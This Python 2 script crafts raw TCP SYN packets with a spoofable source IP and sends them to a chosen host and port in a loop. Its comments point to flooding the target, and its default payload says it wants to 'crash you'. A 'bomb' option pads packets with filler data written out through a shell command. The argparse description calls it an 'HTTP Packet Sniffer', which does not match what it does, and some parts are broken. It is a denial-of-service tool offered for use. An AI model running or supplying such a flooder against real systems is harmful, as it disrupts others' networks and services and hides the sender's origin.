#!/usr/bin/python

import socket, sys, time, argparse, random, os
from struct import *

# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        print(i)
        if i+1 < len(msg):
            w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
            s = s + w

    s = (s>>16) + (s & 0xffff);
    s = s + (s >> 16);

    #complement and mask to 4 byte short
    s = ~s & 0xffff

    return s

def build_ip_header(source, destination):
    # ip header fields
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0	# kernel will fill the correct total length
    ip_id = 54321	#Id of this packet
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0	# kernel will fill the correct checksum
    ip_saddr = socket.inet_aton ( source )	#Spoof the source ip address if you want to
    ip_daddr = socket.inet_aton ( destination )

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    
    return ip_header

def build_tcp(src_ip, dest_ip, dport, packed_user_data):
    # tcp header fields
    tcp_source = random.randint(1025,65535)	# source port
    tcp_dest = dport	# destination port
    tcp_seq = 454
    tcp_ack_seq = 0
    tcp_doff = 5	#4 bit field, size of tcp header, 5 * 4 = 20 bytes
    #tcp flags
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons (5840)	#	maximum allowed window size
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)

    # the ! in the pack format string means network order
    tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)

    tcp_length = len(tcp_header) + len(packed_user_data)

    # pseudo header fields
    source_address = socket.inet_aton(src_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP

    try:
        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
    except:
        psh = pack('!4s4sBBQ', source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header + packed_user_data

    # calculate checksum
    tcp_check = checksum(psh)
    
    # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
    tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)

    return tcp_header


# the main function
def main():

    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer")
    parser.add_argument("-c", "--count", help="Amount of packets to send")
    parser.add_argument("-d", "--destination", help="Destination IP Address")
    parser.add_argument("-p", "--port", help="Destinatin Port")
    parser.add_argument("-s", "--source", help="Source address to send from")
    parser.add_argument("-b", "--bomb", help="Send huge amounts of data")

    args = parser.parse_args()

    #create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # tell kernel not to put in headers, since we are providing it, when using IPPROTO_RAW this is not necessary
    # s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    ## Data to send: can send huge amounts of data here
    send_bomb = int(args.bomb)
    if send_bomb != 0:
        #bashCommand = "python -c 'print \"A\"*40000000' > bomb.txt"
        os.system("python -c 'print \"A\"*4000' > bomb.txt")
        try:
            with open("bomb.txt") as f:
                user_data = f.read()
        except EnvironmentError:
                error("cannot read file {0}".format(args.file))
    else:
        user_data = 'Hi! I want to crash you... :)'

    packed_user_data = pack("s", user_data)

    # Amount of packets to send
    count = int(args.count)
        
    ## Start constructing the packet
    packet = ''

    src_ip = args.source
    dest_ip = args.destination
    dport = int(args.port)

    ip_header = build_ip_header(src_ip, dest_ip)
    tcp_header = build_tcp(src_ip, dest_ip, dport, user_data)
    
    # final full packet - syn packets dont have any data
    packet = ip_header + tcp_header + packed_user_data
    
    
    
    for i in range(count):
        print 'sending packet...'
        # Send the packet finally - the port specified has no effect
        s.sendto(packet, (dest_ip , 80))	# put this in a loop if you want to flood the target 
        print 'send'
        
    print 'all packets send';



if __name__ == "__main__":
    main()